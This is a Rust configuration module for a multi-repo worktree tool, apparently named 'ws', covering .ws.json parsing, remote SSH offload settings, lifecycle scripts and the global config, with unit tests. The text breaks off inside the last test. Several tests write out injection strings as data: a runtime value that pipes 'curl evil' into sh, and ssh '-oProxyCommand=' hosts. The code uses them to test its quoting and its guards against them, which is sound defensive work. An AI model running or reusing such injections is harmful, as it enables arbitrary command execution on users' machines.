use anyhow::{Context, Result};
use serde::{Deserialize, Serialize};
use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

#[derive(Deserialize, Serialize, Default, schemars::JsonSchema)]
pub struct WsConfig {
    #[serde(skip_serializing_if = "Option::is_none", default, rename = "$schema")]
    pub schema: Option<String>,
    /// Private TLD for per-worktree hostnames (routing), e.g. `myapp.test`.
    /// Location-transparent — applies to local and remote alike — so it lives
    /// top-level, not under `remote`.
    #[serde(skip_serializing_if = "Option::is_none", default)]
    pub domain: Option<String>,
    /// Container runtime for `ws`'s own calls (compose introspection, the shared
    /// network, the Caddy container). `"podman"` | `"docker"`; default `"podman"`.
    /// Also top-level: routing is location-transparent, not a remote-only concern.
    #[serde(skip_serializing_if = "Option::is_none", default)]
    pub runtime: Option<String>,
    /// Remote-offload block. Absent → the workspace runs locally. `.ws.json` is
    /// itself per-machine (it describes your local multi-repo layout, not a
    /// shared project config), so the remote target lives here directly — no
    /// separate per-machine overlay file.
    #[serde(skip_serializing_if = "Option::is_none", default)]
    pub remote: Option<RemoteConfig>,
    #[serde(default)]
    pub repos: Vec<RepoEntry>,
}

/// v2 remote-offload block. When present, every repo's stack runs on the
/// server and location-transparent ops (`ws exec`, later `up`/`down`) target it.
/// `runtime` and `domain` are NOT here — they're top-level, because routing
/// applies to local workspaces too (see `WsConfig`).
#[derive(Deserialize, Serialize, schemars::JsonSchema)]
pub struct RemoteConfig {
    /// SSH host to reach the server — a Tailscale MagicDNS name or `~/.ssh/config` alias.
    pub connection: String,
    /// Parent dir on the server holding the synced worktrees. Relative paths are
    /// resolved against the SSH login home; absolute paths are used verbatim.
    /// Omitted → defaults to the workspace's own directory name (so two projects
    /// on one server don't collide). See `worktree_base`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub workspace_path: Option<String>,
    /// Address the server's Caddy publishes its HTTPS port on. Omitted → all
    /// interfaces, because the whole point of offload is that *another* machine
    /// reaches it; loopback would serve only the server itself.
    ///
    /// Set it to pin the server to one address — its tailnet or LAN IP — so a box
    /// with a public interface doesn't serve your worktrees to the internet. Any
    /// address the client can route to works; nothing here assumes Tailscale.
    ///
    /// **Only read when Caddy is created.** Changing it recreates the container on
    /// the next `ws up` (routes survive — they reload from the config volume).
    ///
    /// Local workspaces always publish on loopback and have no equivalent knob:
    /// there is no second machine to reach them, so exposing them would be all
    /// risk and no benefit.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub publish_address: Option<String>,
}

impl RemoteConfig {
    /// Construct a remote block.
    pub fn new(connection: String, workspace_path: Option<String>) -> Self {
        // `publish_address` stays unset: publishing on all interfaces is the
        // working default, and pinning one is a deliberate narrowing.
        Self { connection, workspace_path, publish_address: None }
    }

    /// The server-side parent dir for this workspace's synced worktrees:
    /// the configured `workspace_path`, or the workspace's own directory name
    /// as a home-relative default.
    pub fn worktree_base(&self, ws_root: &Path) -> String {
        self.workspace_path.clone().unwrap_or_else(|| default_worktree_base(ws_root))
    }
}

/// Anchor a `.ws-hooks/`-relative command to the workspace root. `ws` is
/// opinionated that shared hook scripts live in `.ws-hooks/` at the workspace root
/// (pushed to the server for a remote workspace), so a command that starts with
/// `.ws-hooks/` is rewritten to run under `$WS_WORKSPACE_ROOT` — which `ws` sets in
/// the hook env both locally and on the server. So a config names `.ws-hooks/up.sh`
/// and it resolves in either place, without spelling out `$WS_WORKSPACE_ROOT/` or
/// caring that the worktree cwd is elsewhere. Any other command is untouched. The
/// var is quoted so a workspace path with spaces still resolves as one word.
pub fn anchor_ws_hooks(cmd: &str) -> String {
    match cmd.strip_prefix(".ws-hooks/") {
        Some(rest) => format!("\"$WS_WORKSPACE_ROOT\"/.ws-hooks/{rest}"),
        None => cmd.to_string(),
    }
}

/// The default server-side worktree base when none is configured: the
/// workspace's own directory name (so two projects on one server don't collide),
/// or `"workspace"` when the root has no name. Shared by `RemoteConfig::worktree_base`
/// and `ws remote check`'s `--host` path (which has no `RemoteConfig` to ask).
pub fn default_worktree_base(ws_root: &Path) -> String {
    ws_root
        .file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_else(|| "workspace".to_string())
}

/// A repo entry is either a bare name (convention-only) or an object with overrides.
#[derive(Deserialize, Serialize, schemars::JsonSchema)]
#[serde(untagged)]
pub enum RepoEntry {
    Name(String),
    Extended(RepoConfig),
}

#[derive(Deserialize, Serialize, schemars::JsonSchema, Default)]
pub struct RepoConfig {
    pub name: String,
    /// How `ws` launches and de-conflicts this repo's stack. `None` → inferred
    /// (a compose file present ⇒ `Container`, else `Host`).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub kind: Option<RepoKind>,
    /// Routing + per-service ports. For a compose repo this is auto-derived from
    /// `<runtime> compose config` at `ws up` and this block is an optional
    /// override layer; for a host repo it's required (nothing to introspect).
    /// A `BTreeMap` so iteration/serialization order is stable.
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    pub services: BTreeMap<String, ServiceConfig>,
    /// Declarative lifecycle commands, keyed by event (`prepare`, `post-create`,
    /// `up`, `down`, `post-remove`, `status`). Each is one command or an array of
    /// commands, run via `sh -c` with the `WS_*` env forwarded. A value may be a
    /// path to a script file for complex logic. Supersedes `.ws-hooks/`.
    ///
    /// Most events run **where the stack lives** (the server, for a remote
    /// workspace). The exception is **`prepare`**: it runs on the **client** just
    /// before `up`, even when offloading, so it can stage data that only exists
    /// locally (dump the main checkout's db, gather local certs) into the worktree
    /// — the up flush then carries it to the server. It sees `WS_REMOTE`, so one
    /// script can branch (dump-for-sync remotely vs a same-host copy locally).
    /// A `BTreeMap` so a config rewrite (`ws remote set/unset`) is
    /// deterministic — `.ws.json` isn't gitignored, so hash-random key order
    /// would churn a possibly-committed file.
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    pub scripts: BTreeMap<String, Script>,
    /// Explicit env-var injection: your app's var name → a `${WS_*}` template.
    /// `ws` owns `WS_HOST_*`/`WS_PORT_*`; you declare which of your vars get them.
    /// Reference a *sibling* repo's service with `${WS_HOST_<repo>.<svc>}` /
    /// `${WS_PORT_<repo>.<svc>}` (e.g. an api's SSO redirect needs the app's
    /// `${WS_PORT_app.web}`); the peer's value comes from its recorded allocation,
    /// so an unbuilt peer leaves the token literal. A `BTreeMap` so injection order
    /// (and the generated override's `environment:` lines) is deterministic rather
    /// than hash-random.
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    pub env: BTreeMap<String, String>,
    /// Format-blind config templates (the escape hatch): a committed `src`
    /// rendered to a gitignored `dest` with `${WS_*}` tokens substituted.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub templates: Vec<Template>,
    /// Untracked files to seed verbatim from the main checkout into each new
    /// worktree at `ws new` (before post-create, and before a remote sync so they
    /// ride it to the server). Each entry is a repo-relative path — a file, a
    /// directory (copied recursively), or a glob (`storage/oauth-*.key`).
    /// No-clobber (an existing dest is left as-is), and a source with no match is
    /// skipped. Unlike `templates`, the bytes are copied as-is — no substitution.
    /// The lane for dev certs/keys/env that aren't in git.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub copy: Vec<String>,
    /// Legacy per-event hook path overrides. Keys are event names. Values are
    /// paths relative to the config dir. Deprecated by `scripts`; kept until the
    /// execution path migrates. `BTreeMap` for the same rewrite determinism as
    /// `scripts`.
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    pub hooks: BTreeMap<String, String>,
    /// Per-worktree git-exclude entries appended to <wt>/.git/info/exclude.
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub worktree_excludes: Vec<String>,
}

/// How a repo's stack is launched and its ports de-conflicted.
#[derive(Deserialize, Serialize, schemars::JsonSchema, Clone, Copy, PartialEq, Eq, Debug)]
#[serde(rename_all = "lowercase")]
pub enum RepoKind {
    /// Compose stack. N copies de-conflicted via a generated compose override;
    /// supervised by the runtime.
    Container,
    /// Host process (e.g. `cargo run`). Supervised as a detached `ws`-owned
    /// process (PID-file tracked), local or on the server -- no systemd/launchd.
    Host,
}

/// A single service within a repo: its port and whether it's HTTP-routed.
#[derive(Deserialize, Serialize, schemars::JsonSchema, Clone)]
pub struct ServiceConfig {
    /// HTTP routing. A string is the subdomain (`"api"` → `<branch>.api.<domain>`);
    /// `true` routes it using the service name as the subdomain; absent or `false`
    /// means raw TCP — `ws` allocates a host port and exposes `WS_PORT_<service>`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub http: Option<HttpDecl>,
    /// The container-internal (or host-process-bound) port for this service.
    pub port: u16,
    /// **Not yet implemented — accepted and currently ignored.** Intended to run
    /// this service once as shared infra instead of per-worktree (right for
    /// redis/ES; wrong for the SQL DB). Every service is per-worktree today; this
    /// is documented here because the generated schema is what users read, and a
    /// field that describes behaviour it doesn't have is worse than no field.
    #[serde(default, skip_serializing_if = "is_false")]
    pub shared: bool,
    /// Also route *every* subdomain of this service's host to it, so a
    /// multi-tenant app addressed as `<tenant>.<branch>.<subdomain>.<domain>`
    /// resolves for any `<tenant>`. HTTP services only (raw-TCP has no host).
    /// `WS_HOST_<svc>` stays the base host, so the app builds tenant URLs as
    /// `<tenant>.$WS_HOST_<svc>`.
    #[serde(default, skip_serializing_if = "is_false")]
    pub wildcard: bool,
}

impl RepoConfig {
    /// Whether this repo launches as a container (compose) rather than a host
    /// process. Explicit `kind` wins; otherwise inferred from whether a compose
    /// file is present (`has_compose` is evaluated lazily, only when needed).
    /// The single home for the container-vs-host rule the `kind` field documents.
    pub fn is_container(&self, has_compose: impl FnOnce() -> bool) -> bool {
        match self.kind {
            Some(RepoKind::Container) => true,
            Some(RepoKind::Host) => false,
            None => has_compose(),
        }
    }

    /// Whether this repo is an **explicit** `kind: host` process — the trigger
    /// for host-process supervision and per-service port allocation.
    /// Deliberately requires the explicit kind rather than inferring host from a
    /// missing compose file (contrast `is_container`, which treats `kind: None`
    /// as inferred-from-compose): supervision changes how `up` runs, so it's
    /// opt-in.
    pub fn is_host(&self) -> bool {
        matches!(self.kind, Some(RepoKind::Host))
    }
}

impl ServiceConfig {
    /// The HTTP subdomain label for this service, or `None` when it's a raw-TCP
    /// service (gets an allocated host port instead). A `true` decl routes under
    /// the service's own name; a string decl gives an explicit label.
    pub fn subdomain<'a>(&'a self, service_name: &'a str) -> Option<&'a str> {
        match &self.http {
            Some(HttpDecl::Subdomain(s)) => Some(s),
            Some(HttpDecl::Enabled(true)) => Some(service_name),
            _ => None,
        }
    }

    /// Whether this service is HTTP-routed (via Caddy) rather than a raw-TCP
    /// service that needs an allocated host port.
    pub fn is_http(&self) -> bool {
        matches!(self.http, Some(HttpDecl::Subdomain(_)) | Some(HttpDecl::Enabled(true)))
    }
}

/// How a service participates in HTTP routing.
#[derive(Deserialize, Serialize, schemars::JsonSchema, Clone)]
#[serde(untagged)]
pub enum HttpDecl {
    /// Explicit subdomain label.
    Subdomain(String),
    /// `true` → route as HTTP with the service name as the subdomain; `false` → not HTTP.
    Enabled(bool),
}

/// A lifecycle command: one shell command, or several run in order.
#[derive(Deserialize, Serialize, schemars::JsonSchema)]
#[serde(untagged)]
pub enum Script {
    One(String),
    Many(Vec<String>),
}

impl Script {
    /// The command(s) to run, in order.
    pub fn commands(&self) -> &[String] {
        match self {
            Script::One(s) => std::slice::from_ref(s),
            Script::Many(v) => v,
        }
    }

    /// The commands as one fail-fast shell command (`cmd1 && cmd2`), with
    /// `.ws-hooks/…` references anchored to `$WS_WORKSPACE_ROOT` (see
    /// [`anchor_ws_hooks`]) so the same string resolves locally and on the
    /// server. The single home for "what shell string does this script run",
    /// shared by the local runner (`hooks::run_script`) and the remote dispatch
    /// ([`WsConfig::command_for`]).
    pub fn joined(&self) -> String {
        self.commands().iter().map(|c| anchor_ws_hooks(c)).collect::<Vec<_>>().join(" && ")
    }
}

/// A format-blind config template: render `src` → `dest` with `${WS_*}` tokens.
#[derive(Deserialize, Serialize, schemars::JsonSchema)]
pub struct Template {
    pub src: String,
    pub dest: String,
}

fn is_false(b: &bool) -> bool {
    !*b
}

impl WsConfig {
    /// Container runtime for `ws`'s own calls, defaulting to `podman`.
    // The default lives here, not at the call sites, so compose introspection,
    // Caddy and the hook defaults all agree on the runtime.
    pub fn runtime(&self) -> &str {
        self.runtime.as_deref().unwrap_or("podman")
    }

    /// The extended config for `repo`, if it's an object entry (not a bare
    /// name). The single repo→config lookup shared by script/hook resolution.
    pub fn repo_config(&self, repo: &str) -> Option<&RepoConfig> {
        self.repos.iter().find(|r| r.name() == repo).and_then(|r| r.config())
    }

    /// Whether `repo` is an explicit `kind: host` process (a detached ws-owned
    /// process). A bare-name repo, or one without config, is not.
    pub fn is_host_repo(&self, repo: &str) -> bool {
        self.repo_config(repo).map(RepoConfig::is_host).unwrap_or(false)
    }

    /// Whether `repo`'s stack is a compose project: explicit `kind: container`,
    /// else a compose file present in `worktree`. A bare-name repo is inferred the
    /// same way. The single home for "does the compose default apply".
    pub fn is_container_repo(&self, repo: &str, worktree: &Path) -> bool {
        let has = || crate::compose::has_compose_file(worktree);
        match self.repo_config(repo) {
            Some(rc) => rc.is_container(has),
            None => has(),
        }
    }

    /// The declarative lifecycle command for `(repo, event)`, if any: the repo's
    /// `scripts[event]` joined into one fail-fast shell command (`cmd1 && cmd2`).
    /// `None` for a bare-name repo, or one that declares no such event. The single
    /// owner of "what shell command does this event run", shared by the host-repo
    /// launch path and every remote-dispatch caller.
    pub fn script_command(&self, repo: &str, event: &str) -> Option<String> {
        self.repo_config(repo).and_then(|rc| rc.scripts.get(event)).map(Script::joined)
    }

    /// The command for `event`: the declared `scripts` entry, else the container
    /// default (see [`default_script`]) when `is_container`. The bare-string
    /// counterpart to [`crate::hooks::resolve`], for the paths that dispatch a
    /// command rather than an `Action` (remote scripts over SSH, host supervision).
    pub fn command_for(&self, repo: &str, event: &str, is_container: bool) -> Option<String> {
        self.script_command(repo, event)
            .or_else(|| is_container.then(|| default_script(self.runtime(), event)).flatten())
    }

    /// Whether per-worktree HTTP routing is in play: a `domain` is configured.
    /// Location-transparent — routing runs wherever the stack lives, driven
    /// through a [`crate::remote::Site`] (local Caddy, or the server's Caddy over
    /// SSH). The single home for the "is routing on" policy the ops consult.
    pub fn routing_active(&self) -> bool {
        self.domain.is_some()
    }
}

impl RepoEntry {
    pub fn name(&self) -> &str {
        match self {
            RepoEntry::Name(s) => s,
            RepoEntry::Extended(c) => &c.name,
        }
    }

    /// The extended config for this repo, if it's an object entry (not a bare name).
    pub fn config(&self) -> Option<&RepoConfig> {
        match self {
            RepoEntry::Name(_) => None,
            RepoEntry::Extended(c) => Some(c),
        }
    }

    pub fn worktree_excludes(&self) -> &[String] {
        self.config().map_or(&[], |c| c.worktree_excludes.as_slice())
    }

    /// Untracked paths to seed from the main checkout into a new worktree. Empty
    /// for a bare-name repo.
    pub fn copy(&self) -> &[String] {
        self.config().map_or(&[], |c| c.copy.as_slice())
    }
}

/// The compose command a **container** repo falls back to for a lifecycle event
/// when it declares no script and has no legacy `.ws-hooks` file. `ws` already
/// knows the runtime and injects `COMPOSE_FILE` + `COMPOSE_PROJECT_NAME`, so the
/// obvious command needs no restating in every project's config.
///
/// `post-create` gets no default — there's no generic "set this project up" step.
/// `post-remove` reaps the worktree's volumes: they're `ws`-namespaced artifacts
/// (`COMPOSE_PROJECT_NAME=<branch>-<repo>`), so a plain `compose down` would orphan
/// them, and recreating the branch later would silently reuse stale data. It runs
/// at destroy time only (`ws rm` / `ws clean`) — never `ws down`, which must stay
/// reversible.
///
/// `runtime` is `shell_quote`d: these run via `sh -c` and the value comes from a
/// possibly-cloned `.ws.json` (same posture as `compose::remote_compose_script`).
pub fn default_script(runtime: &str, event: &str) -> Option<String> {
    let args = match event {
        "up" => "compose up -d",
        "down" => "compose down",
        "status" => "compose ps -q | wc -l",
        "post-remove" => "compose down -v",
        _ => return None,
    };
    Some(format!("{} {args}", crate::remote::shell_quote(runtime)))
}

/// Load a workspace config from `<workspace-root>/.ws.json`.
pub fn load(root: &Path) -> Result<WsConfig> {
    let cfg: WsConfig = read_json(&root.join(".ws.json"))?;
    // Reject a dangerous SSH destination at the single choke point every op
    // shares. `.ws.json` is only convention-per-machine — it isn't gitignored, so
    // a cloned repo could carry a hostile `remote.connection` like
    // `-oProxyCommand=…` that `ssh` would run as a local command. See
    // `remote::connection_looks_safe`.
    if let Some(r) = &cfg.remote {
        if !crate::remote::connection_looks_safe(&r.connection) {
            anyhow::bail!(
                "refusing an unsafe remote.connection `{}` in .ws.json — an SSH host \
                 must not start with `-` (it would be parsed as an ssh option)",
                r.connection
            );
        }
        // Checked here rather than at the point of use so a typo surfaces on any
        // command, not only the ones that bring routing up. A hostname is refused
        // as well as junk: it could resolve elsewhere later and silently move
        // where the server publishes.
        if let Some(a) = r.publish_address.as_deref().map(str::trim).filter(|a| !a.is_empty()) {
            match a.parse::<std::net::IpAddr>() {
                Ok(ip) if ip.is_multicast() => anyhow::bail!(
                    "remote.publish_address `{a}` in .ws.json is a multicast address — \
                     give an address of the server itself"
                ),
                Err(_) => anyhow::bail!(
                    "remote.publish_address `{a}` in .ws.json is not an IP address — \
                     give the server's tailnet/LAN address, or omit it to publish on all"
                ),
                Ok(_) => {}
            }
        }
    }
    Ok(cfg)
}

/// The machine-global `ws` config dir: `$XDG_CONFIG_HOME/ws/` or `~/.config/ws/`.
/// Holds cross-workspace state (the global config, the pinned Caddy boot config,
/// the persisted HTTPS port, the exported root CA).
pub fn global_dir() -> PathBuf {
    if let Ok(x) = std::env::var("XDG_CONFIG_HOME") {
        if !x.is_empty() {
            return PathBuf::from(x).join("ws");
        }
    }
    let home = std::env::var("HOME").unwrap_or_else(|_| ".".to_string());
    PathBuf::from(home).join(".config").join("ws")
}

/// Cross-workspace defaults, stored git-style at `~/.config/ws/config.toml`
/// (see `global_dir`). Written by `ws config set`; read wherever a per-workspace
/// value has a machine-wide default — today the remote host a bare
/// `ws init --remote` / `ws remote set` falls back to (precedence: flag >
/// `$WS_REMOTE_HOST` > this). Keys are a closed set: a typo'd key is an error,
/// never a silently-ignored orphan entry.
/// `deny_unknown_fields` here and on the sections: `ws config set` rewrites
/// this whole file, so an unknown key (a typo'd hand-edit, or a section a
/// newer `ws` wrote before a downgrade) that parsed silently would be silently
/// DROPPED on the next write. Refusing loudly at load names the file and the
/// key instead of eating the user's edit.
#[derive(Deserialize, Serialize, Default)]
#[serde(deny_unknown_fields)]
pub struct GlobalConfig {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    remote: Option<GlobalRemote>,
}

#[derive(Deserialize, Serialize, Default)]
#[serde(deny_unknown_fields)]
struct GlobalRemote {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    host: Option<String>,
}

/// Every key `ws config` understands, for error messages and docs.
pub const GLOBAL_KEYS: &[&str] = &["remote.host"];

fn unknown_key(key: &str) -> anyhow::Error {
    anyhow::anyhow!("unknown config key `{key}` — known keys: {}", GLOBAL_KEYS.join(", "))
}

impl GlobalConfig {
    /// The on-disk location: `<global_dir>/config.toml`.
    pub fn path() -> PathBuf {
        global_dir().join("config.toml")
    }

    /// Load the global config; a missing file is an empty config (nothing set
    /// yet), a malformed one is an error (never silently drop a user's edits).
    pub fn load() -> Result<Self> {
        let p = Self::path();
        let raw = match std::fs::read_to_string(&p) {
            Ok(s) => s,
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(Self::default()),
            Err(e) => return Err(e).with_context(|| format!("read {}", p.display())),
        };
        toml::from_str(&raw).with_context(|| format!("parse {}", p.display()))
    }

    pub fn save(&self) -> Result<()> {
        let dir = global_dir();
        std::fs::create_dir_all(&dir).with_context(|| format!("create {}", dir.display()))?;
        let s = toml::to_string_pretty(self).context("serialize global config")?;
        std::fs::write(Self::path(), s).with_context(|| format!("write {}", Self::path().display()))
    }

    /// The value at `key`, or `None` when unset. Unknown keys are an error.
    pub fn get(&self, key: &str) -> Result<Option<&str>> {
        match key {
            "remote.host" => Ok(self.remote_host()),
            _ => Err(unknown_key(key)),
        }
    }

    /// Set `key` to `value`. Unknown keys and unsafe values are errors.
    pub fn set(&mut self, key: &str, value: &str) -> Result<()> {
        match key {
            "remote.host" => {
                // Same guard as `.ws.json`'s remote.connection: this value ends
                // up as an ssh argv element, so an option-shaped host is refused.
                crate::remote::ensure_connection_safe(value)?;
                self.remote.get_or_insert_with(Default::default).host = Some(value.to_string());
            }
            _ => return Err(unknown_key(key)),
        }
        Ok(())
    }

    /// Remove `key`. Returns whether it was set. Unknown keys are an error.
    pub fn unset(&mut self, key: &str) -> Result<bool> {
        match key {
            // `host` is [remote]'s only field, so unsetting it drops the whole
            // section — no bare `[remote]` header lingers in the file. Revisit
            // (prune only when all fields are None) when a second key lands.
            "remote.host" => Ok(self.remote.take().is_some_and(|r| r.host.is_some())),
            _ => Err(unknown_key(key)),
        }
    }

    /// The machine-wide default remote host, if configured.
    pub fn remote_host(&self) -> Option<&str> {
        self.remote.as_ref().and_then(|r| r.host.as_deref())
    }
}

/// Write `value` as pretty JSON with a trailing newline. The single home for
/// the on-disk JSON style `ws` writes (`.ws.json`, the schema, `.ws-meta`).
pub fn write_json_pretty<T: Serialize>(path: &Path, value: &T) -> Result<()> {
    let s = serde_json::to_string_pretty(value)?;
    std::fs::write(path, format!("{s}\n")).with_context(|| format!("write {}", path.display()))
}

fn read_json<T: for<'de> Deserialize<'de>>(p: &Path) -> Result<T> {
    let raw = std::fs::read_to_string(p)
        .with_context(|| format!("read {}", p.display()))?;
    // Strip a leading UTF-8 BOM. Some Windows editors + `git core.autocrlf`
    // configurations materialize one; serde_json otherwise reports the
    // opaque `expected value at line 1 column 1`.
    let trimmed = raw.strip_prefix('\u{feff}').unwrap_or(&raw);
    serde_json::from_str(trimmed).with_context(|| format!("parse {}", p.display()))
}

#[cfg(test)]
mod tests {
    use super::anchor_ws_hooks;

    #[test]
    fn anchor_ws_hooks_prefixes_only_a_ws_hooks_reference() {
        // A `.ws-hooks/` script is anchored to the (quoted) workspace root...
        assert_eq!(
            anchor_ws_hooks(".ws-hooks/up.sh"),
            "\"$WS_WORKSPACE_ROOT\"/.ws-hooks/up.sh"
        );
        assert_eq!(
            anchor_ws_hooks(".ws-hooks/db/seed.sh --fresh"),
            "\"$WS_WORKSPACE_ROOT\"/.ws-hooks/db/seed.sh --fresh"
        );
        // ...while an ordinary command is left exactly as written.
        assert_eq!(anchor_ws_hooks("podman compose up -d"), "podman compose up -d");
        assert_eq!(anchor_ws_hooks("echo .ws-hooks/x"), "echo .ws-hooks/x");
    }

    #[test]
    fn container_defaults_cover_the_compose_lifecycle() {
        assert_eq!(default_script("podman", "up").as_deref(), Some("podman compose up -d"));
        assert_eq!(default_script("docker", "down").as_deref(), Some("docker compose down"));
        assert_eq!(
            default_script("podman", "status").as_deref(),
            Some("podman compose ps -q | wc -l")
        );
        // Destroy-time only — reaps the worktree's ws-namespaced volumes.
        assert_eq!(
            default_script("podman", "post-remove").as_deref(),
            Some("podman compose down -v")
        );
        // No generic "set this project up" step.
        assert_eq!(default_script("podman", "post-create"), None);
        assert_eq!(default_script("podman", "nonsense"), None);
    }

    #[test]
    fn default_script_quotes_a_hostile_runtime() {
        // `runtime` comes from a possibly-cloned `.ws.json` and these run via `sh -c`.
        let s = default_script("podman; curl evil | sh #", "down").unwrap();
        assert!(s.starts_with("'podman; curl evil | sh #' compose down"), "{s}");
    }

    use super::*;

    fn write_cfg(dir: &Path, json: &str) {
        std::fs::write(dir.join(".ws.json"), json).unwrap();
    }

    #[test]
    fn load_refuses_a_publish_address_that_isnt_an_address() {
        // Checked at load, not at first use, so a typo doesn't lie dormant until
        // the one command that brings routing up.
        for bad in ["localhost", "1.2.3.4:8443", "0.0.0.0/0", "not-an-ip", "224.0.0.1"] {
            let dir = tempfile::tempdir().unwrap();
            write_cfg(
                dir.path(),
                &format!(
                    r#"{{"repos":[],"remote":{{"connection":"h","publish_address":"{bad}"}}}}"#
                ),
            );
            let err = match load(dir.path()) {
                Err(e) => e.to_string(),
                Ok(_) => panic!("expected {bad:?} to be refused"),
            };
            assert!(
                err.contains("publish_address"),
                "expected {bad:?} refused, got: {err}"
            );
        }
    }

    #[test]
    fn load_accepts_ipv4_ipv6_and_an_absent_publish_address() {
        for good in [r#","publish_address":"100.64.1.3""#, r#","publish_address":"fd7a::1""#, ""] {
            let dir = tempfile::tempdir().unwrap();
            write_cfg(
                dir.path(),
                &format!(r#"{{"repos":[],"remote":{{"connection":"h"{good}}}}}"#),
            );
            assert!(load(dir.path()).is_ok(), "expected {good:?} accepted");
        }
    }

    #[test]
    fn read_json_strips_utf8_bom() {
        let tmp = tempfile::NamedTempFile::new().unwrap();
        std::fs::write(tmp.path(), "\u{feff}{\"repos\":[]}").unwrap();
        let cfg: WsConfig = read_json(tmp.path()).unwrap();
        assert!(cfg.repos.is_empty());
    }

    #[test]
    fn parses_top_level_domain_runtime_and_remote() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join(".ws.json"),
            r#"{"domain":"myapp.test","repos":["api"],"remote":{"connection":"srv","workspace_path":"workspace"}}"#,
        )
        .unwrap();
        let cfg = load(dir.path()).unwrap();
        assert_eq!(cfg.domain.as_deref(), Some("myapp.test"));
        // runtime absent → defaults to podman via the accessor.
        assert_eq!(cfg.runtime(), "podman");
        let remote = cfg.remote.expect("remote block");
        assert_eq!(remote.connection, "srv");
        assert_eq!(remote.workspace_path.as_deref(), Some("workspace"));
    }

    #[test]
    fn load_rejects_an_option_shaped_remote_connection() {
        // A hostile `.ws.json` (not gitignored → can arrive via a clone) with a
        // connection ssh would parse as an option must be refused at load.
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join(".ws.json"),
            r#"{"remote":{"connection":"-oProxyCommand=touch /tmp/pwned"},"repos":[]}"#,
        )
        .unwrap();
        let err = load(dir.path()).err().expect("load should reject the connection");
        assert!(
            err.to_string().contains("unsafe remote.connection"),
            "expected the load to reject an option-shaped connection: {err}"
        );
    }

    #[test]
    fn runtime_override_is_read() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join(".ws.json"), r#"{"runtime":"docker","repos":[]}"#).unwrap();
        assert_eq!(load(dir.path()).unwrap().runtime(), "docker");
    }

    #[test]
    fn parses_extended_repo_with_services_scripts_env_templates() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join(".ws.json"),
            r#"{"repos":[{
                "name":"api","kind":"container",
                "services":{"app":{"http":"api","port":80},"mysql":{"port":3306},"redis":{"port":6379,"shared":true}},
                "scripts":{"post-create":["composer install","php artisan migrate"],"up":"docker compose up -d"},
                "env":{"APP_URL":"https://${WS_HOST_app}"},
                "templates":[{"src":"nginx.conf.tmpl","dest":"nginx.conf"}]
            }]}"#,
        )
        .unwrap();
        let cfg = load(dir.path()).unwrap();
        let repo = cfg.repos[0].config().expect("extended repo");
        assert_eq!(repo.kind, Some(RepoKind::Container));

        let app = &repo.services["app"];
        assert_eq!(app.port, 80);
        assert!(matches!(app.http, Some(HttpDecl::Subdomain(ref s)) if s == "api"));
        assert!(!app.shared);
        assert!(repo.services["mysql"].http.is_none());
        assert!(repo.services["redis"].shared);

        assert!(matches!(repo.scripts["post-create"], Script::Many(ref v) if v.len() == 2));
        assert!(matches!(repo.scripts["up"], Script::One(ref s) if s == "docker compose up -d"));
        assert_eq!(repo.env["APP_URL"], "https://${WS_HOST_app}");
        assert_eq!(repo.templates[0].src, "nginx.conf.tmpl");
        assert_eq!(repo.templates[0].dest, "nginx.conf");
    }

    #[test]
    fn http_true_and_bare_name_repo() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join(".ws.json"),
            r#"{"repos":["web",{"name":"api","services":{"app":{"http":true,"port":8080}}}]}"#,
        )
        .unwrap();
        let cfg = load(dir.path()).unwrap();
        // Bare-name entry stays valid and carries no extended config.
        assert_eq!(cfg.repos[0].name(), "web");
        assert!(cfg.repos[0].config().is_none());
        let app = &cfg.repos[1].config().unwrap().services["app"];
        assert!(matches!(app.http, Some(HttpDecl::Enabled(true))));
    }

    #[test]
    fn global_config_set_get_unset_round_trip() {
        let mut g = GlobalConfig::default();
        assert_eq!(g.get("remote.host").unwrap(), None);

        g.set("remote.host", "srv").unwrap();
        assert_eq!(g.get("remote.host").unwrap(), Some("srv"));

        // Serialize → parse round-trips the value (the on-disk TOML shape).
        let toml_s = toml::to_string_pretty(&g).unwrap();
        assert!(toml_s.contains("[remote]") && toml_s.contains("host = \"srv\""));
        let back: GlobalConfig = toml::from_str(&toml_s).unwrap();
        assert_eq!(back.remote_host(), Some("srv"));

        // A typo'd hand-edit must refuse at parse, not read as unset — `save`
        // rewrites the whole file, so a silently-ignored key would be silently
        // dropped by the next `ws config set`.
        let e = toml::from_str::<GlobalConfig>("[remote]\nhosst = \"x\"\n")
            .map(|_| ())
            .expect_err("unknown TOML key must be refused");
        assert!(e.to_string().contains("hosst"), "{e}");

        // Unset reports it was set, and prunes the emptied [remote] section.
        assert!(g.unset("remote.host").unwrap());
        assert!(g.remote.is_none(), "emptied section must be pruned");
        assert_eq!(toml::to_string_pretty(&g).unwrap(), "");
        // Unsetting again is a no-op, not an error.
        assert!(!g.unset("remote.host").unwrap());
    }

    #[test]
    fn global_config_rejects_unknown_keys_and_unsafe_hosts() {
        let mut g = GlobalConfig::default();
        for r in [
            g.get("remote.hots").map(|_| ()),
            g.set("no.such.key", "x"),
            g.unset("remote").map(|_| ()),
        ] {
            let e = r.expect_err("unknown key must be refused");
            assert!(e.to_string().contains("known keys"), "{e}");
        }
        // The host lands in ssh argv later — option-shaped values are refused at
        // set time (same posture as config::load's connection guard).
        let e = g.set("remote.host", "-oProxyCommand=evil").expect_err("unsafe host");
